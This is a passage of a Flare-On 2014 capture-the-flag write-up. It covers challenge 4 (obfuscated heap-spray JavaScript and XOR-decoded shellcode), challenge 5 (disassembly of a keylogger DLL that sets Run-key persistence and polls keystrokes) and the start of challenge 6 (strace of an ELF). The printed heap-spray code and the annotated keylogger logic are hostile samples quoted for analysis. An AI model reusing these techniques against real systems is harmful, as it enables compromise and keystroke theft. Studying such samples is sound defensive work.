    fJWhwERSDZtaZXlhcREfhZjCCVqFAPS = 20;
    fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA = fJWhwERSDZtaZXlhcREfhZjCCVqFAPS+ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length
    while (OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length<fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA) OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHT+=OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;
    UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
    MOysyGgYplwyZzNdETHwkru = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length-fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
    while(MOysyGgYplwyZzNdETHwkru.length+fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA < 0x40000) MOysyGgYplwyZzNdETHwkru = MOysyGgYplwyZzNdETHwkru+MOysyGgYplwyZzNdETHwkr+UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;
    DPwxazRhwbQGu = new Array();
    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<100;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = MOysyGgYplwyZzNdETHwkru + ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;

    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=142;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA>=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += unescape("%ub550%u0166");
    bGtvKT = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length + 20;
        while (zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length < bGtvKT) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
    Juphd = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, bGtvKT);
    QCZabMzxQiD = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length-bGtvKT);
    while(QCZabMzxQiD.length+bGtvKT < 0x40000) QCZabMzxQiD = QCZabMzxQiD+QCZabMzxQiD+Juphd;
    FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = new Array();
    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<125;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA]= QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
{{< /codecaption >}}

Obfuscated JavaScript. I executed it and printed the last variable, but the result was garbage. The code just does a lot of computatation. However variable ``IxTUQnOvHg`` looks suspicious. A large number of bytes are unescaped. After reading some guides, I found out how to decode this. ``%u72f9`` should be converted to ``0xf972``. I wrote a simple Python program to do this decoding. Read 6 characters, discard the first two (%u), swap characters 3 and 4 with 5 and 6. The end result is some shellcode. I used this website to convert it to an executable: [http://sandsprite.com/shellcode\_2\_exe.php](http://sandsprite.com/shellcode_2_exe.php).

After running the executable in Immunity debugger a message box pops up with an encoded message. If we look inside memory, we can find this string:

![MessageBox Text](/images/2014/flare/4-1.jpg "MessageBox Text")

{{< codecaption lang="nasm" title="First string in hex" >}}
2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46
{{< /codecaption >}}

The length is close to the email (29 bytes). Here's what I thought. If it is the email then the last 13 bytes should be ``@flare-on.com``. It's probably xor-ed with a key. If the key is smaller than 13 bytes then it is repeated and we can easily find it. How? xor is transitive. If ``plaintext xor key = ciphertext`` then ``key = plaintext xor ciphertext``. If we xor the last 13 bytes of ciphertext with ``@flare-on.com`` then we will find the last 13 bytes of the key. If key is smaller than plain/ciphertext (if key is as long as plain/ciphertext then we will have a ``one time pad``) it is repeated.

The following Python code does it. On a side note, we really need a string xor operator in Python. I wrote one which is probably not that good.

{{< codecaption lang="python" title="First string xor" >}}
def xor(mydata,mykey):
    keylen = len(mykey)
    datalen = len(mydata)

    # easier to just extend the key array, but probably not that efficient
    # not that we care about it here ;)
    key = mykey * ( (datalen/keylen)+1 )

    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(mydata,key))

from binascii import hexlify, unhexlify

# last 13 bytes
ciphertext = unhexlify("2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46")[-13:]
plaintext = "@flare-on.com"

print xor(ciphertext,plaintext)
print hexlify( xor (ciphertext,plaintext) )

# result - :(
# jEiPELKEHB+
# 6a45695019451a4c4b4548422b

{{< /codecaption >}}

Nope. Doesn't look like it.

I usually wander around in the debugger and look at memory. Run the executable in Immunity and look around in memory after the message box pops up. A little bit further up from the original message we see more ``OWNED!!!`` strings (title of the message box). Right before two owneds I saw another string. This one is longer and looks more promising. Right click on it and select ``Follow in Dump``. Select the string  and again right click and select ``Copy > To clipboard``. It's in Unicode so ``5`` represented as ``0x0035`` instead of ``0x35``.

![Interesting String](/images/2014/flare/4-2.jpg "Interesting String")

{{< codecaption lang="nasm" title="Second string in hex" >}}
# I did not select the first 00 before 5 (0x0035)
00143868  35 00 24 00 74 00 25 00  5.$.t.%.
00143870  2A 00 6B 00 21 00 75 00  *.k.!.u.
00143878  2F 00 6B 00 36 00 36 00  /.k.6.6.
00143880  2E 00 75 00 74 00 32 00  ..u.t.2.
00143888  31 00 05 00 23 00 2A 00  1..#.*.
00143890  23 00 37 00 20 00 6B 00  #.7. .k.
00143898  2D 00 2B 00 6B 00 25 00  -.+.k.%.
001438A0  2D 00 28                 -.(

# or in Python-friendly format
352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28
{{< /codecaption >}}

Let's apply the xor-logic on this string too.

{{< codecaption lang="python" title="Second string xor" >}}
# add xor function from last example
from binascii import hexlify, unhexlify

# last 13 bytes
ciphertext = unhexlify("352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28")[-13:]
plaintext = "@flare-on.com"

print xor(ciphertext,plaintext)
print hexlify( xor (ciphertext,plaintext) )

# result :)
# EEFBEEFBEEFBE
# 45454642454546424545464245
{{< /codecaption >}}

Bingo. The key is ``BEEF``. It is also in the initial shellcode as a string. Let's xor it with the complete string and get the flag.

#### Level 4 flag: wa1ch.d3m.spl01ts@flare-on.com

---

## <a name="ch5"></a> Challenge 5 - 5get About It

```
Another one bites the dust!
Here's some more fun for you, password is the same as always.
-FLARE
```

### Be sure to run this challenge in a VM.

The file inside the challenge zip is named ``5get_it`` and is around 100KBs. A quick look with ``HxD`` says it's a Portable Executable (MZ and PE magic bytes). Let's get some help from ``PE-Studio``. It has a VirusTotal score of 29/55 with most AVs calling it a generic trojan or keylogger. Click on ``Imported Symbols`` and look at the red symbols. Some of them are more interesting than others. To get more information about any of them, right click and select ``Query MSDN`` inside PE-Studio (handy, neh?).

{{< codecaption lang="nasm" title="Interesting symbols" >}}
RegSetValueExA - RegCreateKeyA: Messing with registry
CreateFileW - CreateFileA - WriteFile - CopyFileA: Creating, writing to, and copying file
GetAsyncKeyState: "Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState"
{{< /codecaption >}}

Also, let's run ``strings`` on it. I used [cygwin](https://www.cygwin.com/). I have omitted the garbage and only kept the interesting strings:

{{< codecaption lang="nasm" title="Interesting strings" >}}
$ strings.exe 5get_it
svchost.log
[SHIFT]
[RETURN]
[BACKSPACE]
[TAB]
[CTRL]
[DELETE]
[CAPS LOCK]
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
svchost
c:\windows\system32\svchost.dll
c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll
{{< /codecaption >}}

While doing the challenge only the first and last two lines were interesting to me.

* It references ``c:\windows\system32\svchost.dll`` and ``svchost.log`` but there is no such file (Windows has ``svchost.exe`` in that location).
* There is also ``c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll`` which means this file is most probably a DLL and should be executed like that. There are no parameters, so whatever this DLL is doing should be in ``DllMain``.

**By this time you probably know what this file is supposed to do (also look at the registry key). However, at that time I did not make the connection :(**

Let's drop this into ``IDA`` and jump into DllMain. I used IDA Pro but both IDA free and trial and Immunity Debugger work for this challenge (and also [challenge 7](#ch7)). Put a breakpoint at the start of this function (``F2`` key).

![DLL Entry Point](/images/2014/flare/5-1.jpg "DLL Entry Point")

If we attempt to execute the tile. IDA will complain. It's a DLL and cannot be run by itself. But we already know how to run it thanks to the strings inside the binary. In IDA first select ``Local Win32 Debugger`` then go to ``Debugger`` menu and select ``Process Options``. In the ``Application`` textbox enter ``c:\windows\system32\rundll32.exe``. In ``Parameters`` enter the path to the DLL. Don't forget to rename the file, add dll extension and include double-quotes around the path if it contains spaces (e.g. ``"c:\Flare Challenges\Ch5\5get_it.dll",0``). It didn't work without the dll extension for me.

Let's start debugging. We observe standard stuff until we reach ``.text:1000A6BB call    sub_1000A570``.

![sub 1000A570](/images/2014/flare/5-2.jpg "sub 1000A570")

Inside the function we encounter [RegOpenKeyEx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724897%28v=vs.85%29.aspx) that opens a registry key. Full registry key is a combination of ``hKey`` and ``lpSubKey``. ``hKey`` can be one of the [predefined keys](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724836%28v=vs.85%29.aspx). The constants for the predefined keys needed a bit of googling because the MSDN page didn't list them. Here they are:

    .
    | Key                 | Constant |
    |---------------------|----------|
    | HKEY_CLASSES_ROOT   |    0     |
    | HKEY_CURRENT_USER   |    1     |
    | HKEY_LOCAL_MACHINE  |    2     |
    | HKEY_USERS          |    3     |
    | HKEY_CURRENT_CONFIG |    5     |
    .

The binary is pushing ``0x02`` for ``hKey`` and ``SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`` for ``lpSubKey`` which will result in the full path ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run``. If function succeeds it will return ``ERROR_SUCCESS`` which is 0 according to [this page](http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx), otherwise it will return another error code.

![Registry Key](/images/2014/flare/5-3.jpg "Registry Key")

The binary will check if it has access to registry at that path. If so then the return value (in eax) will be 0 and it will jump right (JZ will succeed).  
[RegQueryValueEx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724911%28v=vs.85%29.aspx) checks if there is a registry key at an open path. It is looking for a registry key named ``svchost`` at that path. If such key exists, function will return 0. In this case, it returned 2 which stands for ``ERROR_FILE_NOT_FOUND`` meaning there was no such key. Then it will call [RegCloseKey](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724837%28v=vs.85%29.aspx) and closes the open registry path. This function's return value is saved in ``var_110`` (we will need it later):

    .
    |           Condition          |         Return Value          |
    |------------------------------|-------------------------------|
    |Registry key cannot be opened |               1               |
    |Registry key does not exist   |               2               |
    |Registry key exists           | 1000A6BB or DllMain(x,x,x)+3B |
    .

After that function, we see that it is calling ``GetModuleHandleEx`` for ``sub_1000A610`` in lines 3-8 and checks the return value in line 9. The return value for [GetModuleHandleEx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683200%28v=vs.85%29.aspx) will be non-zero, otherwise it will be zero. If call was not successful then last error will be printed to file.

{{< codecaption lang="nasm" title="Returning from sub_1000A570" >}}
.text:1000A6BB call    sub_1000A570
.text:1000A6C0 mov     [ebp+var_110], eax              ; return value stored in var_110
.text:1000A6C6 mov     [ebp+phModule], 0
.text:1000A6D0 lea     ecx, [ebp+phModule]
.text:1000A6D6 push    ecx                             ; phModule
.text:1000A6D7 push    offset sub_1000A610             ; lpModuleName
.text:1000A6DC push    6                               ; dwFlags
.text:1000A6DE call    ds:GetModuleHandleExA
.text:1000A6E4 test    eax, eax
.text:1000A6E6 jnz     short loc_1000A711              ; if (eax!=0) jmp loc_1000A711
.text:1000A6E8 call    ds:GetLastError                 ; if (eax==0) print LastError to file
.text:1000A6EE mov     [ebp+var_120], eax
.text:1000A6F4 mov     edx, [ebp+var_120]
.text:1000A6FA push    edx
.text:1000A6FB push    offset aGetmodulehandl          ; "GetModuleHandle returned %d\n"
.text:1000A700 call    sub_1000AD77
.text:1000A705 add     eax, 40h
.text:1000A708 push    eax                             ; FILE *
.text:1000A709 call    _fprintf
.text:1000A70E add     esp, 0Ch
{{< /codecaption >}}

If ``GetModuleHandleEx`` was successful it will land here. [GetModuleFileName](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683197%28v=vs.85%29.aspx) is called which will return the full path for the specified module in ``hModule``. In this case, the binary retrieves its own path (line 9) and saves it in ``[ebp+Filename]``. In line 10, return value of ``sub_1000A570`` is compared with 2.

{{< codecaption lang="nasm" title="Getting Dll path" >}}

.text:1000A711
.text:1000A711 loc_1000A711:
.text:1000A711 push    100h            ; nSize
.text:1000A716 lea     eax, [ebp+Filename]
.text:1000A71C push    eax             ; lpFilename
.text:1000A71D mov     ecx, [ebp+phModule]
.text:1000A723 push    ecx             ; hModule
.text:1000A724 call    ds:GetModuleFileNameA
.text:1000A72A cmp     [ebp+var_110], 2           ; comparing return value of sub_1000A570 with 2
.text:1000A731 jnz     short loc_1000A772         ; if return value is not 2, then jump to loc_1000A772
{{< /codecaption >}}

If registry key did not exist, we will continue.

{{< codecaption lang="nasm" title="CopyFile" >}}

.text:1000A733 mov     [ebp+lpNewFileName], offset aCWindowsSystem ; "c:\\windows\\system32\\svchost.dll"
.text:1000A73D mov     [ebp+var_124], offset aCWindowsSyst_0 ; "c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll"
.text:1000A747 push    0               ; bFailIfExists - 0 means overwrite if file already exists
.text:1000A749 mov     edx, [ebp+lpNewFileName]
.text:1000A74F push    edx             ; lpNewFileName ; "c:\\windows\\system32\\svchost.dll"
.text:1000A750 lea     eax, [ebp+Filename]
.text:1000A756 push    eax             ; lpExistingFileName - Dll name from GetModuleFileName
.text:1000A757 call    ds:CopyFileA
.text:1000A75D mov     ecx, [ebp+var_124]   ; From line 2
.text:1000A763 push    ecx
.text:1000A764 call    sub_1000A610
.text:1000A769 add     esp, 4
.text:1000A76C mov     [ebp+var_114], eax

{{< /codecaption >}}

We have already seen the strings being loaded in lines 1 and 2. Then ``CopyFile`` is called to copy itself to ``c:\\windows\\system32\\svchost.dll``.

{{< codecaption lang="nasm" title="sub_1000A610" >}}

.text:1000A610 push    ebp
.text:1000A611 mov     ebp, esp
.text:1000A613 sub     esp, 0Ch
.text:1000A616 lea     eax, [ebp+phkResult]
.text:1000A619 push    eax             ; phkResult
.text:1000A61A push    offset aSoftwareMicr_0 ; "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
.text:1000A61F push    80000002h       ; hKey   "HKEY_LOCAL_MACHINE"
.text:1000A624 call    ds:RegCreateKeyA
.text:1000A62A mov     [ebp+var_C], eax
.text:1000A62D cmp     [ebp+var_C], 0
.text:1000A631 jnz     short loc_1000A663

; Continue if RegCreateKey was successful
.text:1000A633 mov     ecx, [ebp+lpData]  ; "c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll"
.text:1000A636 push    ecx             ; char *
.text:1000A637 call    _strlen
.text:1000A63C add     esp, 4
.text:1000A63F push    eax             ; cbData - strlen(lpData)
.text:1000A640 mov     edx, [ebp+lpData]
.text:1000A643 push    edx             ; lpData - ; "c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll"
.text:1000A644 push    1               ; dwType
.text:1000A646 push    0               ; Reserved
.text:1000A648 push    offset aSvchost_0 ; "svchost"
.text:1000A64D mov     eax, [ebp+phkResult]
.text:1000A650 push    eax             ; hKey
.text:1000A651 call    ds:RegSetValueExA
.text:1000A657 mov     [ebp+var_4], 0
.text:1000A65E mov     eax, [ebp+var_4]
.text:1000A661 jmp     short loc_1000A673

.text:1000A673 loc_1000A673:
.text:1000A673 mov     esp, ebp
.text:1000A675 pop     ebp
.text:1000A676 retn

{{< /codecaption >}}

Line 9 pushes ``c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll`` to the stack and calls ``sub_1000A610`` in line 10. Based on this string and checking for existence of the registry key we can guess what is going to happen in this function.

Inside this function we see that [RegCreateKey](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724842%28v=vs.85%29.aspx) to open ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run``. If the key does not exist, it will create it.

If call was successful, execution continues to line 14. It is adding a new registry key named ``svchost`` to that path with the specified value. Then function will return with the result value of RegSetValueEx. If it was successful, it will be 0.

*The Dll copied itself to system32 and it will run every time Windows starts*.


{{< codecaption lang="nasm" title="Returning from sub_1000A610" >}}

.text:1000A757 call    ds:CopyFileA
.text:1000A75D mov     ecx, [ebp+var_124]
.text:1000A763 push    ecx
.text:1000A764 call    sub_1000A610     ; Create registry key
.text:1000A769 add     esp, 4
.text:1000A76C mov     [ebp+var_114], eax   ; Not used anymore
.text:1000A772 loc_1000A772:
.text:1000A772 call    sub_1000A4C0
.text:1000A777 mov     [ebp+var_118], eax
.text:1000A77D mov     eax, [ebp+var_118]
.text:1000A783 mov     ecx, [ebp+var_4]
.text:1000A786 xor     ecx, ebp
.text:1000A788 call    @__security_check_cookie@4 ; __security_check_cookie(x)
.text:1000A78D mov     esp, ebp
.text:1000A78F pop     ebp
.text:1000A790 retn    0Ch
.text:1000A790 _DllMain@12 endp
.text:1000A790

{{< /codecaption >}}

After we return from ``sub_1000A610``, we land in line 5. Return value will be saved in ``var_114`` (0 is key was created). If we highlight this variable and press ``x`` in IDA to get external references (meaning where else this variable is being referenced and manipulated. It is not referenced anymore so we do not care about it. In line 8, a new function is called ``sub_1000A4C0``. Let's go inside.

![1000A4C0](/images/2014/flare/5-4.jpg "1000A4C0")

Inside ``sub_1000A4C0`` we can see that the jump to return is never taken. Because eax is set to 1 and then checked for being zero and if zero the function will return. So let's look at the other branch.

{{< codecaption lang="nasm" title="sub_1000A4C0" >}}

.text:1000A4D3 call    _rand
.text:1000A4D8 cdq
.text:1000A4D9 mov     ecx, 0C8h
.text:1000A4DE idiv    ecx
.text:1000A4E0 add     edx, 32h
.text:1000A4E3 mov     [ebp+var_10], edx    ; var_10 = size of array of type size_t
.text:1000A4E6 mov     edx, [ebp+var_10]
.text:1000A4E9 imul    edx, 0Fh
.text:1000A4EC push    edx             ; size_t
.text:1000A4ED call    _malloc
.text:1000A4F2 add     esp, 4
.text:1000A4F5 mov     [ebp+var_C], eax ; pointer to allocated memory
.text:1000A4F8 mov     eax, [ebp+var_10]    ; eax = size of array
.text:1000A4FB imul    eax, 0Fh
.text:1000A4FE push    eax             ; size_t
.text:1000A4FF push    0               ; int
.text:1000A501 mov     ecx, [ebp+var_C]
.text:1000A504 push    ecx             ; void *
.text:1000A505 call    _memset         ; Initialize array with 0
.text:1000A50A add     esp, 0Ch
.text:1000A50D push    0Ah             ; dwMilliseconds
.text:1000A50F call    ds:Sleep        ; Sleep for 10 miliseconds
.text:1000A515 xor     edx, edx        ; edx = 0
.text:1000A517 mov     [ebp+var_8], dx ; var_8 = 0

.text:1000A51B loc_1000A51B:
.text:1000A51B movsx   eax, [ebp+var_8]   ; eax = 0
.text:1000A51F cmp     eax, [ebp+var_10]  ; if (0 => size of array)
.text:1000A522 jge     short loc_1000A554 ; if (no memory was allocated) - jump to loc_1000A554

; if memory was allocated
.text:1000A524 push    0Ah             ; dwMilliseconds
.text:1000A526 call    ds:Sleep        ; Sleep for 10 miliseconds
.text:1000A52C call    sub_10009EB0
.text:1000A531 mov     [ebp+var_14], eax    ; var_14 = sub_10009EB0()
.text:1000A534 cmp     [ebp+var_14], 0
.text:1000A538 jz      short loc_1000A55
{{< /codecaption >}}

Line 1 calls ``rand`` and the result is modified a few times by doing some calculations in lines 3-8. In line 9, it is pushed to stack as argument for ``malloc``. So a random number of bytes are allocated. Seems like it is allocating an array of type ``size_t``. This is reinforced because the number is multiplied by 16 (size of size_t) in line 8 before being pushed to the stack. After the ``malloc``, the pointer to the allocated memory is stored in ``var_C``. In lines 13-19 we see that this array is reset to zero by ``memset``. Line 22 calls sleep with 10 miliseconds. Last line compares the calculated size of array with 0 and if so then no memory was allocated and program jumps back to the start of the function and tries to allocate memory and initialize memory again. If memory was allocated we continue to line 32 sleep for 10 miliseconds and call ``sub_10009EB0``.

{{< codecaption lang="nasm" title="sub_10009EB0" >}}

.text:10009EB0 sub_10009EB0 proc near
.text:10009EB0
.text:10009EB0 var_8= dword ptr -8
.text:10009EB0 var_4= word ptr -4
.text:10009EB0
.text:10009EB0 push    ebp
.text:10009EB1 mov     ebp, esp
.text:10009EB3 sub     esp, 8
.text:10009EB6 mov     eax, 8
.text:10009EBB mov     [ebp+var_4], ax   ; var_4 = 0
.text:10009EBF jmp     short loc_10009ECD

.text:10009ECD loc_10009ECD:
.text:10009ECD movsx   edx, [ebp+var_4]
.text:10009ED1 cmp     edx, 0DEh
.text:10009ED7 jg      loc_1000A3A4 ; if var_4 > 222 (0xDE) jump to loc_1000A3A4

.text:10009EDD movsx   eax, [ebp+var_4]
.text:10009EE1 push    eax             ; vKey
.text:10009EE2 call    ds:GetAsyncKeyState
.text:10009EE8 movsx   ecx, ax
.text:10009EEB cmp     ecx, 0FFFF8001h ; check if vKey was pressed
.text:10009EF1 jnz     loc_1000A39F    ; jumptable 1000A2D4 default case

.text:1000A39F loc_1000A39F:           ; jumptable 1000A2D4 default case
.text:1000A39F jmp     loc_10009EC1

.text:10009EC1 loc_10009EC1:
.text:10009EC1 mov     cx, [ebp+var_4]
.text:10009EC5 add     cx, 1
.text:10009EC9 mov     [ebp+var_4], cx ; (var_4)++
; go back to line 14

{{< /codecaption >}}

This is what we are looking for. First ``var_4`` is set to 0 in line 10, then it is compared with 222 in lines 15-16 . If it is larger, we jump to ``loc_1000A3A4``.

If not we will reach line 18 where ``var_4`` (initially 0) is stored in eax and pushed to stack as parameter for ``GetAsyncKeyState``. We already know what this function does. If ``vKey`` has been pressed since last call to ``GetAsyncKeyState``, it will return a value. Otherwise it will return 0. This [forum thread from 2007](http://reversing.be/forum/viewtopic.php?t=628&sid=bf0d5e83ef43f1c34c41cd5cd2793a76) discusses this usecase.  
If the key was not pressed, we jump to line 26 and then 29 where ``var_4`` is increased by 1. Then we go back to line 14 where ``var_4`` is compared with 222 and the cycle is repeated.

Now we know that the application loops through ascii characters from 0 to 222 checking to see if a key was pressed. If so we will not jump at line 23 and continue. Let's take a look at that.

![Key pressed](/images/2014/flare/5-5.jpg "Key pressed")

This code is a series of cases for a switch statement (as IDA has detected). It checks what key was pressed performs specific actions for each key (taking the red arrows). It checks from ``0x27`` to ``0x60``. By looking at an ASCII table, we can see that the application checks for some special characters, number and letters. I am not going to describe what each one does but I went through each function and looked at the code. Most of them were the same and looked uninteresting but the function for ``M`` or ``0x4D`` caught my eye. Finding the code for ``M`` and clicking on the red arrow besides it.

{{< codecaption lang="nasm" title="If M is pressed" >}}
.text:1000A1B6 loc_1000A1B6:
.text:1000A1B6 movsx   eax, [ebp+var_4]
.text:1000A1BA cmp     eax, 4Dh
.text:1000A1BD jnz     short loc_1000A1C9

.text:1000A1BF call    sub_10009AF0

{{< /codecaption >}}

What is ``sub_10009AF0``?

![sub10009Af0](/images/2014/flare/5-6.jpg "sub10009AF0")

Nice, IDA has even tagged it as M for us. First we see that a ``dword_10017000`` is compared to 0. and if it is larger than 0, two functions are called: ``__cfltcvt_init`` and ``sub_10001240``. Then returns with value ``m``.

![__cfltcvt_init](/images/2014/flare/5-7.jpg "__cfltcvt_init")

``__cfltcvt_init`` sets one variable to 1 and resets the rest (including ``dword_10017000``).

``sub_10001240`` creates a large array, initializes it with some values and then calles ``GetWindowLong`` and ``DialogBoxIndirectParam``. I put a breakpoint in the end. Change the IP to the start of this function and ran the program.

![ASCII Flare](/images/2014/flare/5-8.jpg "ASCII Flare")

Nice! So to get this ASCII art we have to press M and ``dword_10017000`` needs to be 0. Let's get back to ``sub_10009AF0`` and investigate ``dword_10017000``.

Highlight ``dword_10017000`` and press ``x`` in IDA to see where this variable is being set to 1 (which will make the if true). There is only one place.

![Where M is set](/images/2014/flare/5-9.jpg "Where M is set")

Notice the ``o``? Now see that variable ``dword_100194F8`` needs to be 1 to reach this line (top right). Follow that using ``x``.

So we have ``m`` and then ``o``. If we follow the chain and then reverse it, we have the flag. The binary is a keylogger, it saves all keystrokes to ``svchost.log``.

#### Level 5 flag: l0gging.Ur.5tr0ke5@flare-on.com

---

## <a name="ch6"></a> Challenge 6 - IDA Appreciation Day

```
Great success!
We've got another evil one for you, see if you can figure this out. This one will be rougher. Good luck!
-FLARE
```

While I was writing this solution, I saw this alternative way of solving the challenge. Great read: [Solving FireEye's Flare On Six via Side Channels](http://gaasedelen.blogspot.com/2014/09/solving-fireeyes-flare-on-six-via-side.html).

New binary. Named ``e7bc5d2c0cf4480348f5504196561297``. Let's google it and [first result](http://pedump.me/e7bc5d2c0cf4480348f5504196561297/) is interesting. Filename has the ``exe`` extension but it is a 64-bit ELF executable. Opening the file in ``HxD`` shows us the ELF magic bytes.

{{< codecaption lang="bash" title="Info from pedumpme" >}}
filename  spyEye1.4.exe
size      1221064 (0x12a1c8)
md5       e7bc5d2c0cf4480348f5504196561297
type      ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
{{< /codecaption >}}

I started a Kali 64-bit VM in VirtualBox. Less mess with it a bit. I used IDA Remote Linux Debugger. IDA was running on my host OS and the binary was in the Kali 64-bit VM.

{{< codecaption lang="bash" title="Running commands" >}}
# the same as the website
$ file e7bc5d2c0cf4480348f5504196561297
e7bc5d2c0cf4480348f5504196561297: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped

$ strings e7bc5d2c0cf4480348f5504196561297
# results in a bunch of random strings
# looks like a mix of error messages, source code and random words
/index.html
Nosebleed   # Heartbleed eh? :)
../nptl/sysdeps/unix/sysv/linux/x86_64/../fork.c
info[20]->d_un.d_val == 7
...

# let's see shared library calls - nope
$ ltrace ./e7bc5d2c0cf4480348f5504196561297
ltrace: Couldn't find .dynsym or .dynstr in "./e7bc5d2c0cf4480348f5504196561297"

# Let's run the binary manually
# running it normally
$ ./e7bc5d2c0cf4480348f5504196561297
no

# one argument - different message
$ ./e7bc5d2c0cf4480348f5504196561297 arg1
na

# longer argument - message did not change
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111
na

# two arguments - message changed
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2
bad

# three arguments - message changed - shoule we stop?
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3
stahp

# four arguments - message is the same - we should stop
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3 arg4
stahp
{{< /codecaption >}}

I did not try executing the binary with different number of arguments at the start. I tried different argument lengths, really long arguments (e.g. 'A'*40000). In the end I decided that two arguments was the correct way to run the binary. While debugging I realized that the binary crashes with a segfault message. While it is fine without the debugging. So some anti-debugging protections must be at work. We ran ``ltrace`` and didn't see any shared library calls. Let's run ``strace`` to get system calls.

{{< codecaption lang="bash" title="strace output" >}}
$ strace ./e7bc5d2c0cf4480348f5504196561297
execve("./e7bc5d2c0cf4480348f5504196561297", ["./e7bc5d2c0cf4480348f55041965612"...], [/* 31 vars */]) = 0
uname({sys="Linux", node="kali", ...})  = 0
brk(0)                                  = 0x13e5000
brk(0x13e61c0)                          = 0x13e61c0
arch_prctl(ARCH_SET_FS, 0x13e5880)      = 0
brk(0x14071c0)                          = 0x14071c0
brk(0x1408000)                          = 0x1408000
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f20ba6fb000
write(1, "no\n", 3no
)                     = 3
exit_group(52)                          = ?

$ strace ./e7bc5d2c0cf4480348f5504196561297 arg1
execve("./e7bc5d2c0cf4480348f5504196561297", ["./e7bc5d2c0cf4480348f55041965612"..., "arg1"], [/* 31 vars */]) = 0
uname({sys="Linux", node="kali", ...})  = 0
brk(0)                                  = 0x18cb000
brk(0x18cc1c0)                          = 0x18cc1c0
arch_prctl(ARCH_SET_FS, 0x18cb880)      = 0
brk(0x18ed1c0)                          = 0x18ed1c0
